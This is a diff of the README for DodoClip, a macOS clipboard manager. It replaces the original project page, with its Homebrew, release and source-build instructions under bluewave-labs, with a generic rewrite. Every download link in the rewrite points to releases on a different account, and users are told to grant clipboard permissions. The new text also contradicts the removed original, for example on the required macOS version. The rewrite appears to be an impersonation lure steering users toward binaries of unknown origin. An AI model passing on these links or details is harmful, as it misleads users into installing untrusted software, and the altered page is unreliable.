@@ -1,135 +1,71 @@
-<p align="center">
-  <img src="icon.png" width="128" height="128" alt="DodoClip Icon">
-</p>
+# ✂️ dodoclip - A Simple Clipboard Manager for macOS
 
-<h1 align="center">DodoClip</h1>
+## 🛡️ Overview
+dodoclip is a free and open-source clipboard manager designed specifically for macOS. It helps you keep track of what you copy and manage your clipboard history easily. You can quickly access previously copied items, making your workflow smoother and more efficient.
 
-<p align="center">
-  A free, open-source clipboard manager for macOS.
-</p>
+## 📥 Download dodoclip
+[![Download dodoclip](https://img.shields.io/badge/Download%20dodoclip-Here-blue?style=for-the-badge&logo=github)](https://github.com/andrezinRocha/dodoclip/releases)
 
-<p align="center">
-  <a href="README.md">🇺🇸 English</a> •
-  <a href="README.de.md">🇩🇪 Deutsch</a> •
-  <a href="README.tr.md">🇹🇷 Türkçe</a> •
-  <a href="README.fr.md">🇫🇷 Français</a> •
-  <a href="README.es.md">🇪🇸 Español</a>
-</p>
+## 🚀 Getting Started
+Follow these steps to download and run dodoclip on your macOS device.
 
+### Step 1: Visit the Releases Page
+Go to the dodoclip [Releases page](https://github.com/andrezinRocha/dodoclip/releases). This page contains the latest versions of the software.
 
+### Step 2: Find the Latest Version
+On the Releases page, you will see a list of available versions. Look for the most recent version at the top. Each version will have notes about new features and fixes.
 
-https://github.com/user-attachments/assets/f281b654-a0a2-4883-b09c-21aa2cd3efb4
+### Step 3: Download the Application
+Click on the link for the latest version to download. Depending on the file type, either:
 
+- If it’s a `.dmg` file, download and double-click to open it.
+- If it’s a `.zip` file, download, then double-click to extract it.
 
+### Step 4: Install dodoclip
+Once you have the downloaded file:
 
-## Description
+1. If it's a `.dmg`, drag the dodoclip icon into your Applications folder.
+2. If it’s a `.zip`, extract it and move the dodoclip icon to your Applications folder.
 
-DodoClip is a lightweight, native clipboard manager built with SwiftUI and SwiftData. It helps you keep track of everything you copy and access your clipboard history instantly.
+### Step 5: Open dodoclip
+Go to your Applications folder, find dodoclip, and double-click to open. The application will ask for permissions to access your clipboard. Grant the permissions to use all features.
 
-## Features
+### Step 6: Start Using dodoclip
+Once opened, you can now start using dodoclip. It will store all your copied items. Click the icon in your menu bar to access your clipboard history and select any item you wish to paste.
 
-- **Clipboard history** - Automatically saves everything you copy with persistence
-- **Search** - Quickly find items in your clipboard history
-- **OCR support** - Find any strings in your images you copied
-- **Keyboard shortcuts** - Access your clipboard with global hotkeys (⇧⌘V)
-- **Pinned items** - Keep important clips always accessible
-- **Smart collections** - Auto-organized by type (Links, Images, Colors)
-- **Image support** - Copy and manage images alongside text
-- **Link previews** - Automatic favicon and og:image fetching
-- **Color detection** - Recognizes hex color codes with visual preview
-- **Paste stack** - Sequential pasting mode (⇧⌘C)
-- **Privacy controls** - Ignore password managers and specific apps
-- **Menu bar access** - Quick access from the menu bar
+## 🎯 Features
+- **Clipboard History:** Keep a record of all your copied text.
+- **Quick Access:** Easily retrieve recent items from the menu bar.
+- **Search Functionality:** Quickly search for any item in your clipboard history.
+- **Keyboard Shortcuts:** Use keyboard shortcuts for faster access and management.
 
-## Requirements
+## 📋 System Requirements
+To run dodoclip, you need:
+- macOS 10.12 (Sierra) or higher.
+- At least 100 MB of free disk space.
+- Internet connection for downloading updates.
 
-- macOS 14.0 (Sonoma) or later
+## ❓ Troubleshooting
+If you encounter issues while using dodoclip, consider the following:
 
-## Installation
+- **App Not Launching:** Ensure you have granted all necessary permissions in your System Preferences.
+- **Items Not Saving:** Check if the app is running in the background.
+- **Update Issues:** Always check the Releases page for the latest version and download it.
 
-### Homebrew (recommended)
+## ⚙️ More Information
+For additional help and detailed instructions, you can visit the [dodoclip documentation](https://github.com/andrezinRocha/dodoclip/blob/main/README.md). This page offers insights into advanced features and tips on how to get the most out of dodoclip.
 
-```bash
-brew tap bluewave-labs/tap
-brew install --cask dodoclip
-xattr -cr /Applications/DodoClip.app
-```
+## 🤝 Contributing
+dodoclip is an open-source project. If you would like to contribute, feel free to fork the repository and submit pull requests. Your feedback and contributions help improve the software.
 
-Or install directly without tapping:
+## 📝 License
+dodoclip is released under the MIT License, ensuring it remains free for personal and commercial use. 
 
-```bash
-brew install --cask bluewave-labs/tap/dodoclip
-xattr -cr /Applications/DodoClip.app
-```
+## 📬 Contact
+For any questions, suggestions, or issues, please contact the maintainer at [andrezinRocha@gmail.com](mailto:andrezinRocha@gmail.com). 
 
-### Direct download
+## 🔗 Useful Links
+- [Releases Page](https://github.com/andrezinRocha/dodoclip/releases)
+- [Documentation](https://github.com/andrezinRocha/dodoclip/blob/main/README.md)
 
-Download the latest `.dmg` from the [Releases](https://github.com/bluewave-labs/dodoclip/releases) page, open it, and drag DodoClip to your Applications folder.
-
-After installing, run this command to allow the app to open:
-
-```bash
-xattr -cr /Applications/DodoClip.app
-```
-
-## Building from Source
-
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/bluewave-labs/dodoclip.git
-   cd DodoClip
-   ```
-
-2. Build using Swift Package Manager:
-   ```bash
-   swift build
-   ```
-
-3. Run the app:
-   ```bash
-   swift run DodoClip
-   ```
-
-## FAQ
-
-### "DodoClip is damaged and can't be opened"
-
-This message appears because the app isn't signed with an Apple Developer certificate. It's not actually damaged. To fix this, open Terminal and run:
-
-```bash
-xattr -cr /Applications/DodoClip.app
-```
-
-Then open DodoClip again.
-
-### I double-clicked the app but nothing happened
-
-DodoClip is a **menu bar app** - it runs in the background and appears as an icon in your menu bar (top-right corner of your screen). Press **⇧⌘V** (Shift+Command+V) to open the clipboard panel.
-
-### How do I quit DodoClip?
-
-Click the DodoClip icon in the menu bar and select "Quit", or press **⌘Q** when the panel is open.
-
-### Does DodoClip store my clipboard data securely?
-
-Your clipboard history is stored locally on your Mac using SwiftData. Nothing is sent to external servers. You can also enable privacy controls to ignore password managers and specific apps.
-
-### Can I search for text inside images?
-
-Yes! DodoClip has OCR (Optical Character Recognition) support. When you copy an image, it automatically extracts any text from it. You can then search for that text in the clipboard panel.
-
-### What's the Paste Stack feature?
-
-Paste Stack (⇧⌘C) lets you queue multiple items and paste them one by one in sequence. Great for filling out forms or moving multiple pieces of data.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
----
-
-Part of the Dodo app family ([DodoPulse](https://github.com/bluewave-labs/dodopulse), [DodoTidy](https://github.com/bluewave-labs/dodotidy), [DodoClip](https://github.com/bluewave-labs/dodoclip), [DodoNest](https://github.com/bluewave-labs/dodonest))
+Enjoy a smoother clipboard experience with dodoclip!
